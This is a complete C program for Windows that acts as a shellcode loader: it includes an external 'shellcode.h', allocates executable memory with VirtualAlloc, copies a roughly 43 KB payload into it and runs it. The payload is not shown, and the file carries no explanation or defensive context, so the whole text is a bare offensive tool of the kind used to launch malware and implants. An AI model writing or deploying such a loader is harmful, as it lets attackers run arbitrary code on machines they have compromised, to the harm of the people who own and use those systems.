#include <windows.h>
#include "shellcode.h"

int main(int argc, char* argv[]) {
    size_t shellcode_size = 42965;
    void* exec = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, shellcode_size);
    ((void(*)())exec)();
    return 0;
}
